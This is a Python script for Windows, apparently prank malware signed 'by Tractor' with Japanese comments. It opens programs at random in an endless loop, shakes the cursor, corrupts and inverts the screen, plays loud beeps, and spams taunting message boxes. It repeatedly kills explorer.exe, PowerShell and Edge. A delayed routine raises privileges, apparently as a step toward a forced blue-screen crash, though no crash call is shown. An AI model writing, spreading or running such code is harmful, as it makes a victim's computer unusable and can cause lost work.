import threading
import winsound
import random
import ctypes
import os
from win32api import *
from win32gui import *
from win32ui import *
from win32con import *
from win32file import *

def run_commands():
    commands = [
        "start",
        "notepad",
        "calc",
        "write",
        "msconfig",
        "mspaint",
        "devmgmt.msc"
    ]
    while True:
        choice_cmd = random.choice(commands)
        os.system(choice_cmd)

def play_beeps():
    while True:
        beep_hz = random.uniform(500, 15000)
        winsound.Beep(beep_hz, 1000)
        Sleep(5)

def shake_cursor():
    while True:
        rd = random.randrange
        oldX, oldY = GetCursorPos()
        newX = oldX + (rd(10)-1) * rd(int((1)/2200+2)) 
        newY = oldY + (rd(10)-1) * rd(int((1)/2200+2))
        SetCursorPos((newX, newY))
        Sleep(1)

def blink_screen():
    HDC = GetDC(0)
    sw, sh = (GetSystemMetrics(0),GetSystemMetrics(1))
    while True:
        Sleep(100)
        PatBlt(HDC, 0, 0, sw, sh, PATINVERT)

def screen_patblt():
    desk_variable = GetDC(0)
    x = GetSystemMetrics(0)
    y = GetSystemMetrics(1)
    while True:
        brush = CreateSolidBrush(RGB(
            random.randrange(255),
            random.randrange(255),
            random.randrange(255)
        ))
        SelectObject(desk_variable, brush)
        PatBlt(
            desk_variable,
            random.randrange(x),
            random.randrange(y),
            random.randrange(x),
            random.randrange(y),
            PATINVERT
        )
        DeleteObject(brush)
        Sleep(5)

def error_icon_spam():
    HDC = GetDC(0)
    while True:
        for count in range(1):
            mouseX, mouseY = GetCursorPos()
            DrawIcon(HDC, mouseX, mouseY, LoadIcon(None, 32513))
            Sleep(10)

def copy_screen():
    sw, sh = (GetSystemMetrics(0),GetSystemMetrics(1))
    HDC = GetDC(0)
    while True:
        StretchBlt(HDC, 50, 50, sw-100, sh-100, HDC, 0, 0, sw, sh, SRCCOPY)
        Sleep(100)

def msgbox_spam():
    messages = [
        "まだPCを使い続ける気か...?",
        "PCは無事終了しております。",
        "もう限界そうだけど大丈夫そ?"
    ]
    icons = [
        MB_ICONEXCLAMATION,
        MB_ICONERROR,
        MB_ICONINFORMATION,
        MB_ICONQUESTION
    ]
    while True:
        MessageBox(random.choice(messages), "by Tractor", MB_OK | random.choice(icons))
        Sleep(1000)

def bsod():
    Sleep(60000)
    MessageBox("Gift for you", "by Tractor", MB_OK | MB_ICONINFORMATION)
    Sleep(100)
    prev = ctypes.c_bool()
    ctypes.c_ulong()
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev))

def taskkill():
    while True:
        os.system("taskkill /f /im powershell.exe")
        os.system("taskkill /f /im explorer.exe")
        os.system("taskkill /f /im msedge.exe")

def main():
    threading.Thread(target=run_commands).start() # ランダムにサイトを開く
    threading.Thread(target=shake_cursor).start() # カーソルをシェイク
    threading.Thread(target=blink_screen).start() # 画面の混乱
    threading.Thread(target=screen_patblt).start() # patbltのループ
    threading.Thread(target=error_icon_spam).start() # エラーアイコンを表示
    threading.Thread(target=copy_screen).start() # 画面をコピー
    threading.Thread(target=play_beeps).start() # 不愉快な音を再生
    threading.Thread(target=msgbox_spam).start() # メッセージボックススパム
    threading.Thread(target=taskkill).start() # taskkillのループ
    threading.Thread(target=bsod).start() # BSODカウントダウン

main()